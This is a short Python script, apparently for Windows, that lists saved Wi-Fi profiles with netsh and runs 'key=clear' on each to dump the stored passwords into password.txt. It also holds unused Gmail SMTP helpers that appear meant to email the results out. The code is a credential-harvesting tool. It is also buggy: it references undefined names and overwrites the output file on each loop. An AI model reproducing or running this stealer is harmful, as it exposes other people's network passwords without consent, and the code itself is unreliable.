from subprocess import check_output
import os
import smtplib as srv
def email(email, password):
    srv = smtplib.SMTP('smtp.gmail.com', 587)
    srv.starttls()
    srv.login(email, password)
def nitish_email(email, password, message):
    '''srv = smtplib.SMTP('smtp.gmail.com', 587)
    srv.starttls()
    srv.login(email,password)'''
    srv.sendmail(email, email, message)

def wifi_network_name(out):
    File=[]
    for i in range (len(out)):
          File.append(chr(out[i]))
    data = ""
    for j in File:
        if j != " ":
            data = data+j
    lst = list(map(str, data.split(r"AllUserProfile:")))
    temp = []
    for i in range(len(lst)-2):
        temp.append(lst[i+2])
    return temp
def plain_text(out): # this function convert byte data to string data
    data = ""
    for i in range(len(out)):
        data = data+chr(out[i])
    return data
def password(lst):
    command = []
    for i in lst:
        a = i[::-1]
        a = a[2::]
        a = a[::-1]
        com = "netsh wlan show profiles "+a+" key=clear"
        command.append(com)
    return command
cmd = ("netsh wlan show profiles")
out = check_output(cmd, shell = True)
lst = wifi_network_name(out)
for i in password(lst):
    try:
        out = check_output((i), shell=True)
        print(plain_text(out), file=open("password.txt",'w'))
    except:
        pass

